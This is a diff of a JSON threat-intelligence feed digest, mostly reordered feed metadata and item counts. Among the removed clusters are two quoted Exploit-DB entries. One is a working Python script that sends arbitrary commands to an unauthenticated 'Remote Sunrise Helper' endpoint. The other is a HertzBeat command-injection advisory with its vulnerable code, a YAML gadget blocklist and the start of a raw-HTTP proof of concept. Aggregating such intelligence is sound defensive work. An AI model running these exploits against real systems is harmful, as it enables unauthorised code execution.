@@ -1,14 +1,14 @@
 {
-  "generated_at": "2026-05-16T15:02:59.246519+00:00",
+  "generated_at": "2026-05-16T16:04:32.016902+00:00",
   "lookback_hours": 168,
   "lookback_human": "7 days",
   "total_feeds": 80,
-  "feeds_ok": 79,
-  "total_items_in_window": 487,
-  "total_clusters_raw": 459,
+  "feeds_ok": 78,
+  "total_items_in_window": 475,
+  "total_clusters_raw": 447,
   "total_clusters_in_packet": 80,
-  "dropped_low_score": 305,
-  "dropped_overflow": 74,
+  "dropped_low_score": 307,
+  "dropped_overflow": 60,
   "cohort_metadata": {
     "threat_research_primary": {
       "description": "Primary vendor and research-team intelligence with strong technical depth.",
@@ -74,6 +74,13 @@
       "item_count": 15,
       "in_window_count": 2
     },
+    "Microsoft Security Blog": {
+      "url": "https://www.microsoft.com/en-us/security/blog/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 7
+    },
     "Microsoft Threat Intelligence": {
       "url": "https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/",
       "cohort": "threat_research_primary",
@@ -87,13 +94,6 @@
       "status": "ok",
       "item_count": 10,
       "in_window_count": 0
-    },
-    "Microsoft Security Blog": {
-      "url": "https://www.microsoft.com/en-us/security/blog/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 7
     },
     "ESET WeLiveSecurity": {
       "url": "https://www.welivesecurity.com/en/rss/feed/",
@@ -116,33 +116,12 @@
       "item_count": 15,
       "in_window_count": 3
     },
-    "Trend Micro Research": {
-      "url": "https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 24,
-      "in_window_count": 0
-    },
     "Google Threat Analysis Group": {
       "url": "https://blog.google/threat-analysis-group/rss/",
       "cohort": "threat_research_primary",
       "status": "parse_error",
       "item_count": 0,
       "in_window_count": 0
-    },
-    "NCSC UK": {
-      "url": "https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml",
-      "cohort": "government_authoritative",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 2
-    },
-    "Cisco Talos": {
-      "url": "https://feeds.feedburner.com/feedburner/Talos",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 15,
-      "in_window_count": 5
     },
     "Citizen Lab": {
       "url": "https://citizenlab.ca/feed/",
@@ -151,18 +130,32 @@
       "item_count": 10,
       "in_window_count": 2
     },
-    "Volexity": {
-      "url": "https://www.volexity.com/feed/",
+    "NCSC UK": {
+      "url": "https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml",
+      "cohort": "government_authoritative",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 2
+    },
+    "Trend Micro Research": {
+      "url": "https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 24,
+      "in_window_count": 0
+    },
+    "Cisco Talos": {
+      "url": "https://feeds.feedburner.com/feedburner/Talos",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 15,
+      "in_window_count": 5
+    },
+    "Sekoia": {
+      "url": "https://blog.sekoia.io/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 0
-    },
-    "PortSwigger Research": {
-      "url": "https://portswigger.net/research/rss",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 40,
       "in_window_count": 0
     },
     "SANS Internet Storm Center": {
@@ -172,11 +165,18 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "Sekoia": {
-      "url": "https://blog.sekoia.io/feed/",
+    "Recorded Future": {
+      "url": "https://www.recordedfuture.com/feed",
       "cohort": "threat_research_primary",
       "status": "ok",
-      "item_count": 10,
+      "item_count": 50,
+      "in_window_count": 3
+    },
+    "PortSwigger Research": {
+      "url": "https://portswigger.net/research/rss",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 40,
       "in_window_count": 0
     },
     "Horizon3 Attack Research": {
@@ -186,12 +186,19 @@
       "item_count": 10,
       "in_window_count": 4
     },
-    "Red Canary": {
-      "url": "https://redcanary.com/feed/",
-      "cohort": "detection_response_operations",
+    "Volexity": {
+      "url": "https://www.volexity.com/feed/",
+      "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 1
+      "in_window_count": 0
+    },
+    "Exploit-DB": {
+      "url": "https://www.exploit-db.com/rss.xml",
+      "cohort": "offensive_vulnerability_research",
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
     },
     "Assetnote": {
       "url": "https://www.assetnote.io/resources/research/rss.xml",
@@ -207,22 +214,8 @@
       "item_count": 10,
       "in_window_count": 2
     },
-    "Recorded Future": {
-      "url": "https://www.recordedfuture.com/feed",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 50,
-      "in_window_count": 3
-    },
-    "Exploit-DB": {
-      "url": "https://www.exploit-db.com/rss.xml",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 50,
-      "in_window_count": 11
-    },
-    "The DFIR Report": {
-      "url": "https://thedfirreport.com/feed/",
+    "Red Canary": {
+      "url": "https://redcanary.com/feed/",
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 10,
@@ -242,6 +235,13 @@
       "item_count": 15,
       "in_window_count": 0
     },
+    "The DFIR Report": {
+      "url": "https://thedfirreport.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 1
+    },
     "Active Countermeasures": {
       "url": "https://www.activecountermeasures.com/feed/",
       "cohort": "detection_response_operations",
@@ -254,21 +254,7 @@
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 2
-    },
-    "Elastic Security Labs": {
-      "url": "https://www.elastic.co/security-labs/rss/feed.xml",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 20,
       "in_window_count": 1
-    },
-    "Sophos X-Ops": {
-      "url": "https://news.sophos.com/en-us/category/threat-research/feed/",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 15,
-      "in_window_count": 3
     },
     "TrustedSec": {
       "url": "https://www.trustedsec.com/feed/",
@@ -277,12 +263,12 @@
       "item_count": 10,
       "in_window_count": 2
     },
-    "Huntress": {
-      "url": "https://www.huntress.com/blog/rss.xml",
+    "Sophos X-Ops": {
+      "url": "https://news.sophos.com/en-us/category/threat-research/feed/",
       "cohort": "detection_response_operations",
       "status": "ok",
-      "item_count": 100,
-      "in_window_count": 6
+      "item_count": 15,
+      "in_window_count": 3
     },
     "Trail of Bits": {
       "url": "https://blog.trailofbits.com/feed/",
@@ -290,6 +276,20 @@
       "status": "ok",
       "item_count": 20,
       "in_window_count": 1
+    },
+    "Elastic Security Labs": {
+      "url": "https://www.elastic.co/security-labs/rss/feed.xml",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 1
+    },
+    "Rapid7": {
+      "url": "https://www.rapid7.com/blog/rss/",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 9
     },
     "SpecterOps": {
       "url": "https://medium.com/feed/specter-ops-posts",
@@ -312,19 +312,12 @@
       "item_count": 100,
       "in_window_count": 5
     },
-    "Rapid7": {
-      "url": "https://www.rapid7.com/blog/rss/",
-      "cohort": "offensive_vulnerability_research",
+    "Huntress": {
+      "url": "https://www.huntress.com/blog/rss.xml",
+      "cohort": "detection_response_operations",
       "status": "ok",
-      "item_count": 20,
-      "in_window_count": 9
-    },
-    "Permiso Security": {
-      "url": "https://permiso.io/blog/rss.xml",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 2
+      "item_count": 100,
+      "in_window_count": 6
     },
     "Orca Security Research": {
       "url": "https://orca.security/resources/blog/feed/",
@@ -340,6 +333,13 @@
       "item_count": 20,
       "in_window_count": 9
     },
+    "Permiso Security": {
+      "url": "https://permiso.io/blog/rss.xml",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 2
+    },
     "Protect AI": {
       "url": "https://protectai.com/blog/rss.xml",
       "cohort": "ai_security_agentic_risk",
@@ -347,16 +347,23 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "Google DeepMind Blog": {
-      "url": "https://deepmind.google/blog/rss.xml",
-      "cohort": "ai_security_agentic_risk",
+    "Wiz Research": {
+      "url": "https://www.wiz.io/feed/rss.xml",
+      "cohort": "cloud_identity_infrastructure",
       "status": "ok",
       "item_count": 100,
-      "in_window_count": 0
+      "in_window_count": 5
     },
     "GreyNoise": {
       "url": "https://www.greynoise.io/blog/rss.xml",
       "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 0
+    },
+    "Google DeepMind Blog": {
+      "url": "https://deepmind.google/blog/rss.xml",
+      "cohort": "ai_security_agentic_risk",
       "status": "ok",
       "item_count": 100,
       "in_window_count": 0
@@ -368,12 +375,12 @@
       "item_count": 30,
       "in_window_count": 21
     },
-    "Wiz Research": {
-      "url": "https://www.wiz.io/feed/rss.xml",
+    "Cloudflare Security": {
+      "url": "https://blog.cloudflare.com/tag/security/rss/",
       "cohort": "cloud_identity_infrastructure",
       "status": "ok",
-      "item_count": 100,
-      "in_window_count": 5
+      "item_count": 20,
+      "in_window_count": 0
     },
     "OpenSSF Blog": {
       "url": "https://openssf.org/feed/",
@@ -389,18 +396,11 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "Cloudflare Security": {
-      "url": "https://blog.cloudflare.com/tag/security/rss/",
+    "Cloudflare Radar": {
+      "url": "https://blog.cloudflare.com/tag/cloudflare-radar/rss/",
       "cohort": "cloud_identity_infrastructure",
       "status": "ok",
       "item_count": 20,
-      "in_window_count": 0
-    },
-    "Embrace the Red": {
-      "url": "https://embracethered.com/blog/index.xml",
-      "cohort": "ai_security_agentic_risk",
-      "status": "ok",
-      "item_count": 100,
       "in_window_count": 0
     },
     "BleepingComputer": {
@@ -410,6 +410,13 @@
       "item_count": 15,
       "in_window_count": 15
     },
+    "Black Hills Information Security": {
+      "url": "https://www.blackhillsinfosec.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 1
+    },
     "Google Cloud Security": {
       "url": "https://cloudblog.withgoogle.com/rss/",
       "cohort": "cloud_identity_infrastructure",
@@ -417,11 +424,32 @@
       "item_count": 20,
       "in_window_count": 18
     },
-    "Cloudflare Radar": {
-      "url": "https://blog.cloudflare.com/tag/cloudflare-radar/rss/",
-      "cohort": "cloud_identity_infrastructure",
+    "The Record": {
+      "url": "https://therecord.media/feed",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 5,
+      "in_window_count": 5
+    },
+    "Embrace the Red": {
+      "url": "https://embracethered.com/blog/index.xml",
+      "cohort": "ai_security_agentic_risk",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 0
+    },
+    "Google Cloud Threat Intelligence": {
+      "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
+      "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 20,
+      "in_window_count": 2
+    },
+    "Team Cymru": {
+      "url": "https://www.team-cymru.com/post/rss.xml",
+      "cohort": "ransomware_ecrime_financial_crime",
+      "status": "ok",
+      "item_count": 100,
       "in_window_count": 0
     },
     "Interconnects": {
@@ -431,40 +459,12 @@
       "item_count": 20,
       "in_window_count": 1
     },
-    "The Record": {
-      "url": "https://therecord.media/feed",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 5,
-      "in_window_count": 5
-    },
-    "Coveware": {
-      "url": "https://www.coveware.com/blog?format=rss",
-      "cohort": "ransomware_ecrime_financial_crime",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 0
-    },
-    "Team Cymru": {
-      "url": "https://www.team-cymru.com/post/rss.xml",
-      "cohort": "ransomware_ecrime_financial_crime",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 0
-    },
     "SecurityWeek": {
       "url": "https://www.securityweek.com/feed/",
       "cohort": "cyber_news_breach_reporting",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 10
-    },
-    "Black Hills Information Security": {
-      "url": "https://www.blackhillsinfosec.com/feed/",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 1
     },
     "Help Net Security": {
       "url": "https://www.helpnetsecurity.com/feed/",
@@ -473,19 +473,19 @@
       "item_count": 10,
       "in_window_count": 10
     },
+    "Coveware": {
+      "url": "https://www.coveware.com/blog?format=rss",
+      "cohort": "ransomware_ecrime_financial_crime",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 0
+    },
     "CyberScoop": {
       "url": "https://cyberscoop.com/feed/",
       "cohort": "cyber_news_breach_reporting",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 10
-    },
-    "Dark Reading": {
-      "url": "https://www.darkreading.com/rss.xml",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 50,
-      "in_window_count": 24
     },
     "Schneier on Security": {
       "url": "https://www.schneier.com/feed/atom/",
@@ -494,19 +494,12 @@
       "item_count": 10,
       "in_window_count": 7
     },
-    "AI Snake Oil": {
-      "url": "https://www.aisnakeoil.com/feed",
-      "cohort": "ai_security_agentic_risk",
+    "Dark Reading": {
+      "url": "https://www.darkreading.com/rss.xml",
+      "cohort": "cyber_news_breach_reporting",
       "status": "ok",
-      "item_count": 20,
-      "in_window_count": 0
-    },
-    "Intel 471": {
-      "url": "https://intel471.com/blog/feed",
-      "cohort": "ransomware_ecrime_financial_crime",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 0
+      "item_count": 50,
+      "in_window_count": 24
     },
     "The Hacker News": {
       "url": "https://feeds.feedburner.com/TheHackersNews",
@@ -515,12 +508,19 @@
       "item_count": 50,
       "in_window_count": 38
     },
-    "Google Cloud Threat Intelligence": {
-      "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
-      "cohort": "threat_research_primary",
+    "AI Snake Oil": {
+      "url": "https://www.aisnakeoil.com/feed",
+      "cohort": "ai_security_agentic_risk",
       "status": "ok",
       "item_count": 20,
-      "in_window_count": 2
+      "in_window_count": 0
+    },
+    "Krebs on Security": {
+      "url": "https://krebsonsecurity.com/feed/",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 1
     },
     "Troy Hunt": {
       "url": "https://www.troyhunt.com/rss/",
@@ -528,6 +528,13 @@
       "status": "ok",
       "item_count": 15,
       "in_window_count": 4
+    },
+    "Intel 471": {
+      "url": "https://intel471.com/blog/feed",
+      "cohort": "ransomware_ecrime_financial_crime",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 0
     },
     "Infosecurity Magazine": {
       "url": "https://www.infosecurity-magazine.com/rss/news/",
@@ -543,20 +550,6 @@
       "item_count": 20,
       "in_window_count": 3
     },
-    "Krebs on Security": {
-      "url": "https://krebsonsecurity.com/feed/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 1
-    },
-    "Risky Business News": {
-      "url": "https://risky.biz/feeds/risky-business-news/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 6
-    },
     "Reddit r/netsec": {
       "url": "https://www.reddit.com/r/netsec/.rss",
       "cohort": "reddit_practitioner_osint",
@@ -571,22 +564,15 @@
       "item_count": 25,
       "in_window_count": 23
     },
-    "Reddit r/cybersecurity": {
-      "url": "https://www.reddit.com/r/cybersecurity/.rss",
-      "cohort": "reddit_practitioner_osint",
-      "status": "ok",
-      "item_count": 25,
-      "in_window_count": 25
-    },
-    "tl;dr sec": {
-      "url": "https://tldrsec.com/feed.xml",
+    "Risky Business News": {
+      "url": "https://risky.biz/feeds/risky-business-news/",
       "cohort": "practitioner_analysis",
       "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
+      "item_count": 100,
+      "in_window_count": 6
     },
-    "Reddit r/msp": {
-      "url": "https://www.reddit.com/r/msp/.rss",
+    "Reddit r/cybersecurity": {
+      "url": "https://www.reddit.com/r/cybersecurity/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 25,
@@ -599,8 +585,8 @@
       "item_count": 25,
       "in_window_count": 25
     },
-    "Reddit r/AskNetsec": {
-      "url": "https://www.reddit.com/r/AskNetsec/.rss",
+    "Reddit r/msp": {
+      "url": "https://www.reddit.com/r/msp/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 25,
@@ -612,6 +598,20 @@
       "status": "ok",
       "item_count": 25,
       "in_window_count": 10
+    },
+    "Reddit r/AskNetsec": {
+      "url": "https://www.reddit.com/r/AskNetsec/.rss",
+      "cohort": "reddit_practitioner_osint",
+      "status": "ok",
+      "item_count": 25,
+      "in_window_count": 25
+    },
+    "tl;dr sec": {
+      "url": "https://tldrsec.com/feed.xml",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 1
     },
     "Just Security": {
       "url": "https://www.justsecurity.org/feed/",
@@ -1229,32 +1229,6 @@
           }
         },
         {
-          "source": "Reddit r/blueteamsec",
-          "cohort": "reddit_practitioner_osint",
-          "title": "Addressing Exchange Server May 2026 vulnerability CVE-2026-42897",
-          "link": "https://www.reddit.com/r/blueteamsec/comments/1teonpo/addressing_exchange_server_may_2026_vulnerability/",
-          "published": "2026-05-16T09:19:46+00:00",
-          "summary": "submitted by /u/digicat [link] [comments]",
-          "taxonomy": {
-            "threat_categories": [
-              "vulnerability_disclosure"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "Microsoft Exchange"
-            ],
-            "cve_ids": [
-              "CVE-2026-42897"
-            ],
-            "attack_techniques": [],
-            "geographic_scope": [],
-            "urgency_signals": [],
-            "content_type": "vulnerability_disclosure",
-            "confidence_tier": "tier_5_chatter"
-          }
-        },
-        {
           "source": "Help Net Security",
           "cohort": "cyber_news_breach_reporting",
           "title": "Unpatched Microsoft Exchange Server vulnerability exploited (CVE-2026-42897)",
@@ -1280,6 +1254,32 @@
             ],
             "content_type": "vulnerability_disclosure",
             "confidence_tier": "tier_4_news"
+          }
+        },
+        {
+          "source": "Reddit r/blueteamsec",
+          "cohort": "reddit_practitioner_osint",
+          "title": "Addressing Exchange Server May 2026 vulnerability CVE-2026-42897",
+          "link": "https://www.reddit.com/r/blueteamsec/comments/1teonpo/addressing_exchange_server_may_2026_vulnerability/",
+          "published": "2026-05-16T09:19:46+00:00",
+          "summary": "submitted by /u/digicat [link] [comments]",
+          "taxonomy": {
+            "threat_categories": [
+              "vulnerability_disclosure"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "Microsoft Exchange"
+            ],
+            "cve_ids": [
+              "CVE-2026-42897"
+            ],
+            "attack_techniques": [],
+            "geographic_scope": [],
+            "urgency_signals": [],
+            "content_type": "vulnerability_disclosure",
+            "confidence_tier": "tier_5_chatter"
           }
         }
       ]
@@ -2256,7 +2256,7 @@
         ]
       },
       "primary": {
-        "source": "Microsoft Threat Intelligence",
+        "source": "Microsoft Security Blog",
         "cohort": "threat_research_primary",
         "title": "Kazuar: Anatomy of a nation-state botnet",
         "link": "https://www.microsoft.com/en-us/security/blog/2026/05/14/kazuar-anatomy-of-a-nation-state-botnet/",
@@ -2288,7 +2288,7 @@
       },
       "corroborating_sources": [
         {
-          "source": "Microsoft Threat Intelligence",
+          "source": "Microsoft Security Blog",
           "cohort": "threat_research_primary",
           "title": "Kazuar: Anatomy of a nation-state botnet",
           "link": "https://www.microsoft.com/en-us/security/blog/2026/05/14/kazuar-anatomy-of-a-nation-state-botnet/",
@@ -2317,7 +2317,7 @@
           }
         },
         {
-          "source": "Microsoft Security Blog",
+          "source": "Microsoft Threat Intelligence",
           "cohort": "threat_research_primary",
           "title": "Kazuar: Anatomy of a nation-state botnet",
           "link": "https://www.microsoft.com/en-us/security/blog/2026/05/14/kazuar-anatomy-of-a-nation-state-botnet/",
@@ -3320,167 +3320,6 @@
       ]
     },
     {
-      "cluster_id": "3bf2fbf315",
-      "priority_score": 14,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [
-          "Microsoft Windows"
-        ],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "geographic_scope": [],
-        "urgency_signals": [
-          "preauth_unauth"
-        ],
-        "content_type": [
-          "uncategorized"
-        ],
-        "confidence_tier": [
-          "tier_1_offensive_research"
-        ]
-      },
-      "primary": {
-        "source": "Exploit-DB",
-        "cohort": "offensive_vulnerability_research",
-        "title": "[local] Remote Sunrise Helper for Windows 2026.14 - Remote Code Execution",
-        "link": "https://www.exploit-db.com/exploits/52565",
-        "published": "2026-05-15T00:00:00+00:00",
-        "summary": "Remote Sunrise Helper for Windows 2026.14 - Remote Code Execution",
-        "full_body": "Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training Remote Sunrise Helper for Windows 2026.14 - Remote Code Execution EDB-ID: 52565 CVE: N/A EDB Verified: Author: Chokri Hammedi Type: local Exploit: / Platform: Windows Date: 2026-05-15 Vulnerable App: # Exploit Title: Remote Sunrise Helper for Windows 2026.14 - Unauthenticated Remote Code Execution # Date: 2026-04-20 # Exploit Author: Chokri Hammedi # Software: https://rs.ltd/latest.php?os=win # Vendor: https://rs.ltd/ # Version: 2026.14 # Tested on: Windows 10 / Windows 11 #!/usr/bin/env python3 import requests, json, sys, urllib3 urllib3.disable_warnings() target = sys.argv[1] cmd = sys.argv[2] url = f\"https://{target}:49762\" headers = {\"X-HostName\": \"a\", \"X-ClientToken\": \"a\", \"X-HostFullModel\": \"a\"} r = requests.get(f\"{url}/api/getVersion\", verify=False, timeout=5) data = r.json() if data.get(\"requires.auth\") == False: r = requests.post(f\"{url}/api/executeScript\", headers={**headers, \"X-Script\": cmd}, verify=False) result = json.loads(r.text) print(result.get('result', result.get('error', ''))) else: print(\"[*] Not vulnerable - authentication required\") Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [
-            "Microsoft Windows"
-          ],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "geographic_scope": [],
-          "urgency_signals": [
-            "preauth_unauth"
-          ],
-          "content_type": "uncategorized",
-          "confidence_tier": "tier_1_offensive_research"
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Exploit-DB",
-          "cohort": "offensive_vulnerability_research",
-          "title": "[local] Remote Sunrise Helper for Windows 2026.14 - Remote Code Execution",
-          "link": "https://www.exploit-db.com/exploits/52565",
-          "published": "2026-05-15T00:00:00+00:00",
-          "summary": "Remote Sunrise Helper for Windows 2026.14 - Remote Code Execution",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "Microsoft Windows"
-            ],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "geographic_scope": [],
-            "urgency_signals": [
-              "preauth_unauth"
-            ],
-            "content_type": "uncategorized",
-            "confidence_tier": "tier_1_offensive_research"
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "7c32077241",
-      "priority_score": 14,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [
-          "Docker",
-          "GitHub"
-        ],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "geographic_scope": [],
-        "urgency_signals": [
-          "poc_available"
-        ],
-        "content_type": [
-          "uncategorized"
-        ],
-        "confidence_tier": [
-          "tier_1_offensive_research"
-        ]
-      },
-      "primary": {
-        "source": "Exploit-DB",
-        "cohort": "offensive_vulnerability_research",
-        "title": "[webapps] Apache HertzBeat 1.8.0 - Remote Code Execution",
-        "link": "https://www.exploit-db.com/exploits/52563",
-        "published": "2026-05-14T00:00:00+00:00",
-        "summary": "Apache HertzBeat 1.8.0 - Remote Code Execution",
-        "full_body": "Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training Apache HertzBeat 1.8.0 - Remote Code Execution EDB-ID: 52563 CVE: N/A EDB Verified: Author: Brett Gervasoni Type: webapps Exploit: / Platform: Multiple Date: 2026-05-14 Vulnerable App: # Exploit Title: Apache HertzBeat 1.8.0 - Remote Code Execution # Google Dork: N/A # Date: 2026-03-09 # Exploit Author: Brett Gervasoni # Vendor Homepage: https://hertzbeat.apache.org/ # Software Link: https://github.com/apache/hertzbeat/releases # Version: 1.8.0 # Tested on: Linux (Docker; official HertzBeat image, uid=0 in container) # CVE: N/A ================================================================================ METADATA ================================================================================ Severity: CRITICAL Impact: Arbitrary command execution via monitoring template (script protocol) CWE: CWE-78 (Improper Neutralization of Special Elements used in an OS Command) Product: Apache HertzBeat — https://hertzbeat.apache.org/ (v1.8.0) Affected Component: ScriptCollectImpl.collect() Affected Endpoint: PUT /api/apps/define/yml Authentication: Required (standard user or admin) Note: Apache Security does not classify this as a vulnerability; see HertzBeat security model: https://hertzbeat.apache.org/docs/help/security_model/ ================================================================================ VULNERABILITY SUMMARY ================================================================================ HertzBeat allows arbitrary OS commands to be executed via the scriptCommand parameter in a monitoring template definition. An authenticated user can overwrite a monitoring template definition via PUT /api/apps/define/yml. The \"define\" body contains YAML parsed into a Job. When the YAML specifies protocol: script, the attacker-controlled scriptCommand string is passed to ProcessBuilder (bash -c \"<command>\") without sanitization. If the overwritten template has active monitoring instances, updateAppCollectJob() re-dispatches them, triggering execution within seconds. If none exist, the attacker can create one via POST /api/monitor to trigger immediate execution. The default Docker deployment runs the process as root (uid=0). ================================================================================ VULNERABLE CODE (REFERENCE) ================================================================================ Sink — ScriptCollectImpl.java (approx. lines 74–114) — direct execution: public void collect(CollectRep.MetricsData.Builder builder, Metrics metrics) { ScriptProtocol scriptProtocol = metrics.getScript(); // ... if (StringUtils.hasText(scriptProtocol.getScriptCommand())) { switch (scriptProtocol.getScriptTool()) { case BASH -> processBuilder = new ProcessBuilder( BASH, BASH_C, scriptProtocol.getScriptCommand().trim()); // payload // ... } } // ... Process process = processBuilder.start(); // executed } YAML gadget blocking — AppController.java (approx. 55–59) — blocks SnakeYAML gadget strings, not shell command injection: private static final String[] RISKY_STR_ARR = {\"ScriptEngineManager\", \"URLClassLoader\", \"!!\", \"ClassLoader\", \"AnnotationConfigApplicationContext\", \"FileSystemXmlApplicationContext\", \"GenericXmlApplicationContext\", \"GenericGroovyApplicationContext\", \"GroovyScriptEngine\", \"GroovyClassLoader\", \"GroovyShell\", \"ScriptEngine\", \"ScriptEngineFactory\", \"XmlWebApplicationContext\", \"ClassPathXmlApplicationContext\", \"MarshalOutputStream\", \"InflaterOutputStream\", \"FileOutputStream\"}; ================================================================================ PROOF OF CONCEPT — RAW HTTP ================================================================================ Replace TARGET with the HertzBeat host. Default port is 1157. Example uses a standard user \"operator\" / \"hertzbeat\" (user role); admin with default password also works. --- Step 1: Authenticate --- POST /api/account/auth/form HTTP/1.1 Host: TARGET:",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [
-            "GitHub",
-            "Docker"
-          ],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "geographic_scope": [],
-          "urgency_signals": [
-            "poc_available"
-          ],
-          "content_type": "uncategorized",
-          "confidence_tier": "tier_1_offensive_research"
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Exploit-DB",
-          "cohort": "offensive_vulnerability_research",
-          "title": "[webapps] Apache HertzBeat 1.8.0 - Remote Code Execution",
-          "link": "https://www.exploit-db.com/exploits/52563",
-          "published": "2026-05-14T00:00:00+00:00",
-          "summary": "Apache HertzBeat 1.8.0 - Remote Code Execution",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "GitHub",
-              "Docker"
-            ],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "geographic_scope": [],
-            "urgency_signals": [
-              "poc_available"
-            ],
-            "content_type": "uncategorized",
-            "confidence_tier": "tier_1_offensive_research"
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "09f484b295",
       "priority_score": 14,
       "member_count": 1,
@@ -3701,31 +3540,18 @@
       "corroborating_source_count": 1,
       "strong_signals": [],
       "taxonomy": {
-        "threat_categories": [
-          "malware",
-          "nation_state",
-          "phishing_social_eng",
-          "vulnerability_disclosure"
-        ],
+        "threat_categories": [],
         "actor_attribution": [],
-        "affected_industries": [
-          "healthcare",
-          "telecommunications"
-        ],
+        "affected_industries": [],
         "affected_products": [
-          "AWS",
